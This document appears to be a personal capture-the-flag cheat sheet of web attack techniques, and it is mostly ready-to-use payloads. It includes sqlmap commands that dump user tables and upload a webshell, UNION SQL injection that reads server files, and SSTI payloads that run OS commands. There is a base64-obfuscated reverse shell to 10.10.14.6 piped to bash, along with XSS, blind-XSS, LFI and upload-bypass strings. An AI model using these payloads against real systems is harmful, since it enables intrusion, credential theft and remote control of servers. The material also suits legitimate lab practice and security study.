# SQL INJECTION(SQLi)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)

We want to find credentials exploring possible DBs and tables. Another way is to read files.


## sqlmap:
- `sqlmap -r request.req --dbs`
- `sqlmap -r request.req -D main --tables`
- `sqlmap -r request.req -D main -T user --columns`
- `sqlmap -r request.req -D main -T user --dump`
- `sqlmap -r req.req --level=5 --risk=3 --batch --file-read=/var/www/html/index.php>`
- `sqlmap -r req.req --level=5 --risk=3 --batch --file-write=/home/kali/Downloads/Exploit/webshell.php --file-dest=/var/www/html/webshell.php`
- `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 --level 5 --risk 3 --batch -D soccer_db -T accounts --dump`

    - `--dbs` Enumerate databases
    - `--tables` Enumerate DB tables
    - `--columns` Enumerate columns
    - `--dump` Get table values
    - `--level` (max 5)
    - `--risk` (max 3)
    - `--batch` Ask no questions
    - `--file-read` Path to file that we want to read from server
    - `--file-write` Path to file that we want to upload to server
    - `--file-dest` Path to location that we want to put the uploaded file

    - `-r` Request file
    - `-D` Select DB
    - `-T` Select Table

## manual:
- `admin' union select 1;-- -`
- FIND ALL DBS:
  `admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -`
- FIND TABLES IN DB:
  `admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -`
- FIND COLUMNS IN TABLE:
  `admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -`
- FIND VALUES:
  `admin' UNION SELECT group_concat(one) FROM flag;-- -`
- READ FILES:
  `admin' UNION SELECT load_file('/var/www/html/index.php');-- -`

## manual time based:
- FIND DB NUMBER OF CHARACTERS:
- `1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23`


## SQL Truncation

SQL truncation is a flaw in the database configuration in which an input is truncated (deleted) when added to the database due to surpassing the maximum defined length. The database management system truncates any newly inserted values to fit the width of the designated column size.

So, where can we find this vulnerability ?? it can be found in any web application that allows users to sign up/register for new accounts.

If the database considers spaces as valid characters between inputs and doesn’t do any trimming before storing the values, an attacker can create a duplicate accounts of an existing user like ‘’admin’’ with many additional spaces and characters — ‘’admin++++++random’’ that are too long to be stored in the specified column and gets deleted after passing the max length.

So, instead of storing “admin++++++random’’ as an entry, the database will truncate the second half to fit it in the column (‘’admin +++++’’).

Next time an attacker logs in to the application with the admin account, the database will search for all matching accounts and will consider them valid for logging in. Therefore any entry with username as admin with space or without is a valid entry that can be used to authenticate to the application.

“admin” == ‘admin +++++’


## Server Side Template Injection(SSTI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#constructing-a-server-side-template-injection-attack)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayLoads 2](https://github.com/payloadbox/ssti-payloads)
- [YouTube](https://www.youtube.com/watch?v=Ce6FGus9UYk&ab_channel=BePractical)

### Payloads:
- `${{<%[%'"}}%\.`
- `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
- `{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}` nodeJS

## COMMAND INJECTION
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- `echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK" | base64${IFS} -d | bash` Send the payload

## LOCAL FILE INCLUSION(LFI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

  - ### LFI TO RCE:
    - `https://github.com/synacktiv/php_filter_chain_generator`

### METHODS:
- `file:///etc/passwd`
- [Common Files](#COMMON-FILES-TO-TESTRETRIVE)

```
"View source code and change image directory"
`curl -k 'https://broscience.htb/includes/img.php?path=../../../../../../etc/passwd'`
```
## Server Side Request Forgery(SSRF)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [YouTube](https://www.youtube.com/watch?v=Zyt7lUO3mY8&ab_channel=LoiLiangYang)

### METHODS:
```
echo 'HTTP/1.1 301 Moved Permanently' >> response
echo 'Location: http://forge.htb/' >> response
echo '' >> response
echo '' >> response
nc -lvnp 8000 < response
```

## Cross-Site Request Forgery(CSRF)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
- [YouTube](https://www.youtube.com/watch?v=V03_7CphtHE&ab_channel=LoiLiangYang)

## Cross Site Scripting(XSS)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [YouTube](https://www.youtube.com/watch?v=PPzn4K2ZjfY&ab_channel=LoiLiangYang)

### DOM
his is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all.
One good example is search bar.

### REFLECTED  
In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. This is often used in phishing attacks where the attacker creates a fakelogin page and sends the URL to the victim. When the victim enters their credentials, the data is sent to the attacker.
Another is to find some URL where it looks like ?q=something.

### STORED/PERSISTED
In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.


- `<iframe src=\"javascript:alert('xss')\">`
- `<iframe src="javascript:alert('xss')">`
- `<iframe src='javascript:alert('xss')'>`
- `<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>`

### BLIND
- `';"</textarea></script><script/src=/bxss.hackwithnahamsec.com/` XSS Hunter
- `</textarea></script><script>alert("This is a basic alert");</script>`

## XML External Entity(XEE)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

## Directory Traversal
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)

## FILE UPLAOD
### BYPASSES:
- `Instead of .php, we can use .phar and use ?page=phar://uploads`